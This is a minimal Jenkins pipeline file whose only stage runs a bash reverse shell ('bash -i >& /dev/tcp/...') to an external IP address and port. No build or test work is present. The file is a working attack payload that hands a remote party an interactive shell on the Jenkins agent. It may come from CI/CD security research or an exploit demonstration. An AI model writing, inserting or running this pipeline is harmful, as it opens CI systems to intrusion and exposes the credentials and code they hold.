pipeline {
  agent any
  stages {
    stage('Stage 1') {
      steps {
        sh 'bash -i >& /dev/tcp/30.52.96.159/2333 0>&1'
      }
    }

  }
}
